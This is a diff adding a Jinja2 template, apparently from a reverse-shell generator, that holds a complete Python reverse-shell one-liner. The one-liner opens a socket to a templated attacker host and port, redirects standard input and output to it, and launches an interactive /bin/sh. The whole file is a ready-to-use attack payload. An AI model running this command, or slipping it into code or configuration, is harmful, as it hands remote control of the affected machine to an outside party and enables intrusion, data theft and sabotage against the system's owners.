@@ -1,0 +1,6 @@
+{# templates/shells/python_reverse.j2
+   Python reverse shell — cross-platform (Linux primary).
+   Avoids /dev/tcp; uses socket module directly.
+   Variables: lhost (str), lport (int)
+#}
+python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{{ lhost }}',{{ lport }}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"
